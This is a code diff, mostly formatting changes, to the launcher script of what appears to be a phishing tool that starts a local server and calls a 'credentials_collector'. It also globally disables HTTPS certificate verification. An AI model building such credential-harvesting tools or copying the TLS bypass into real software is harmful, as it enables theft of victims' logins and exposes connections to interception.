@@ -21,7 +21,9 @@ agreement = simple_informant.terms_of_service_message()
 if not agreement:
     exit()
 
-if not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None):
+if not environ.get("PYTHONHTTPSVERIFY", "") and getattr(
+    ssl, "_create_unverified_context", None
+):
     ssl._create_default_https_context = ssl._create_unverified_context
 
 simple_informant.check_permissions()
@@ -47,12 +49,11 @@ if __name__ == "__main__":
         server_runner.start_server(port)
         server_runner.server_selection(port)
 
-        multiprocessing.Process(
-            target=server_runner.start_server, args=(port,)).start()
+        multiprocessing.Process(target=server_runner.start_server, args=(port,)).start()
         simple_informant.credentials_collector(port)
 
     except KeyboardInterrupt:
         # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
-        port = '8080'
+        port = "8080"
         simple_informant.exit_message(port)
         exit()
